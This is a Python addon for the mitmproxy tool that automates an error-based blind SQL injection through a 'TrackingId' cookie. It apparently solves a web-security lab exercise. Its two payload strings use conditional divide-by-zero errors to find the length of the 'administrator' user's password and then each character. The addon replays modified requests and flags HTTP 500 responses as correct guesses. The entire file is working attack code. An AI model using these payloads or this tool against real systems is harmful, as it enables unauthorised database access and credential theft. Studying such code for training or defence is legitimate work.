import logging
import string
from collections.abc import Sequence
from logging import INFO

from mitmproxy import command, ctx, flow, http
from mitmproxy.log import ALERT

PAYLOAD_PSWD_LEN = "'+AND+(SELECT+CASE+WHEN+(LENGTH(password)='{i}')+THEN+TO_CHAR(1/0)+ELSE+NULL+END+FROM+users+WHERE+username='administrator')='a"
PAYLOAD_PSWD = "'+AND+(SELECT+CASE+WHEN+(SUBSTR(password,{i},1)='{c}')+THEN+TO_CHAR(1/0)+ELSE+NULL+END+FROM+users+WHERE+username='administrator')='a"


class Pswd:
    def __init__(self):
        self.cookies = {}
        self.connected = False

    @command.command("pswd.len")
    def len(self, flows: Sequence[flow.Flow]):
        for flow in flows:
            if self.connected:
                for i in range(30):
                    new_flow = flow.copy()
                    new_flow.metadata["generated"] = True
                    new_flow.metadata["tag"] = i

                    new_flow.request.cookies["TrackingId"] = self.cookies[
                        "TrackingId"
                    ] + PAYLOAD_PSWD_LEN.format(i=i)

                    ctx.master.commands.call("replay.client", [new_flow])

    @command.command("pswd.guess")
    def guess(self, flows: Sequence[flow.Flow], pswd_len: int):
        for flow in flows:
            if self.connected:
                for i in range(1, pswd_len + 1):
                    for c in string.ascii_lowercase + string.digits:
                        new_flow = flow.copy()
                        new_flow.metadata["generated"] = True
                        new_flow.metadata["tag"] = c

                        new_flow.request.cookies["TrackingId"] = self.cookies[
                            "TrackingId"
                        ] + PAYLOAD_PSWD.format(i=i, c=c)
                        new_flow.request.headers["cookie"] = new_flow.request.headers[
                            "cookie"
                        ].replace('"', "")

                        ctx.master.commands.call("replay.client", [new_flow])

    def request(self, flow: http.HTTPFlow):
        # logging.info(f"-> Cookies: {self.cookies}")
        if flow.metadata.get("generated"):
            return

        if self.connected:
            flow.request.cookies["session"] = self.cookies["session"]
            flow.request.cookies["TrackingId"] = self.cookies["TrackingId"]

    def response(self, flow: http.HTTPFlow):
        # logging.log(INFO, f"Connected: {self.connected}")
        # logging.log(INFO, f"<- Cookies: {flow.response.cookies}")
        if self.connected:
            if flow.response.status_code == 500:
                tag = flow.metadata.get("tag")
                logging.log(ALERT, f"Tag {tag} is GOOD")
        else:
            self.cookies["TrackingId"] = flow.response.cookies["TrackingId"][0]
            self.cookies["session"] = flow.response.cookies["session"][0]
            self.connected = True


addons = [Pswd()]
